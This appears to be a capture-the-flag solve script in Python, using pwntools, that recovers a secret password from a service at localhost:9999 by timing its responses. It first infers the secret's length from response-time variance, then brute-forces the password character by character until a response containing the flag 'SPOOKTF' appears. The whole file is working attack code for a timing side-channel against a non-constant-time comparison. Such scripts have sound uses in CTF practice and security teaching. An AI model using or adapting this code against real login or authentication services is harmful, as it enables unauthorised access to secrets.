import statistics
import string
import time
import pwn

CHARACTERS = string.ascii_lowercase + " "

def measure(target: pwn.remote, phrase: str) -> tuple[float, bytes]:
    target.sendline(phrase.encode())

    start = time.time()
    response = target.recvline()
    end = time.time() - start

    return end, response

if __name__ == "__main__":
    target = pwn.remote("localhost", 9999)
    variances = []
    correct = ""

    # Step 0: Minimise any noise by performing some 1-length comparisons before taking any measurements.
    for _ in range(16):
        measure(target, "a")

    # Step 1: Evaluate times for different lengths of secrets.
    # The correct length will end up being evaluated with a 150ms delay compared to the rest.
    for i in range(16):
        measurements = [measure(target, c + "a" * i)[0] for c in CHARACTERS]
        average = statistics.variance(measurements)
        pwn.info(f"Secret of length {i + 1:02} has variance {average:.5}")
        variances.append(average)

    # Step 2: Guess the length by taking the highest variance.
    length = variances.index(max(variances)) + 1
    pwn.info(f"Assuming secret to be {length} characters in length")

    # Step 3: Measure each character individually.
    # At some point, the correct password will be measured.
    with pwn.log.progress("Leaking secret") as progress:
        for i in range(len(correct), length):
            measurements = []

            for c in CHARACTERS:
                delay, response = measure(target, correct + c + "a" * (length - len(correct) - 1))

                # If the response includes SPOOKTF, well...
                if b"SPOOKTF" in response:
                    progress.success(response.decode())
                    exit()

                measurements.append(delay)

            character = CHARACTERS[measurements.index(max(measurements))]
            correct += character
            progress.status(repr(correct))
